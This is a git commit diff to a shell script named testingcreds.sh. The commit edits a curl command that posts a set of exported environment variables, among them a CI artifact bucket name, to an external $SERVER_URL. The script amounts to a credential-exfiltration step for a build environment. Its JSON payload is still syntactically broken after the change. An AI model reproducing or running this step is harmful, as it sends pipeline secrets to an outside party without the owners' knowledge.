2e548211711472924aa59596bc1e39b659963441
shrkanchExternal <131476692+shrkanchExternal@users.noreply.github.com>
2023-04-28 12:47:23 -0700

    Update testingcreds.sh

--- testingcreds.sh
+++ testingcreds.sh
@@ -15,6 +15,6 @@ export VAR5=$ARTIFACT_BUCKET_NAME
 echo Sending environment variables to server...
 
 echo Send environment variables to server
-curl -X POST -H "Content-Type: application/html" -d "{\"VAR1\":\"$VAR1\",\"VAR2\":\"$VAR2\",\"VAR3\":\"$VAR3\,\"VAR4\":\"$VAR4\,\"VAR5\":\"$VAR5\""}" $SERVER_URL
+curl -X POST -H "Content-Type: application/html" -d "{\"VAR1\":\"$VAR1\",\"VAR2\":\"$VAR2\",\"VAR3\":\"$VAR3\,\"VAR4\":\"$VAR4\,\"VAR5\":\"$VAR5\"}" $SERVER_URL
 
 echo Environment variables sent to server.
